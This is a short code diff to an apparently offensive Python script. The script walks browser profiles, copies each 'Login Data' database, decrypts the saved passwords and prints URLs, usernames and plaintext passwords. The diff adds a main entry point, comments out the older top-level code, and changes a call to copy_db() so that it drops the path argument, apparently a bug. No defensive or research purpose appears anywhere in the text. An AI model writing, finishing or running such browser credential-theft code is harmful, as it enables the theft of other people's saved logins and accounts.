@@ -82,7 +82,7 @@ def extract_passwords_from_profiles():
         db_path = os.path.join(profile_path, "Login Data")
         if folder.startswith("Profile") and os.path.isfile(db_path):
             print(f"\nExtracting from: {folder}\n{'='*40}")
-            db_file = copy_db(db_path)
+            db_file = copy_db()
             entries = read_db(db_file)
             for origin_url, username_value, password_value in entries:
                 dec_pass = decrypt_passes(password_value, key)
@@ -92,8 +92,11 @@ def extract_passwords_from_profiles():
 
 
 
+if __name__ == "__main__":
+    extract_passwords_from_profiles()
 
-key = get_aes()
+
+'''key = get_aes()
 db_file = copy_db()
 entries = read_db(db_file)
 
@@ -101,4 +104,4 @@ entries = read_db(db_file)
 for origin_url, username_value, password_value in entries:
     dec_pass = decrypt_passes(password_value, key)
     if username_value or dec_pass:
-        print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")
+        print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")'''
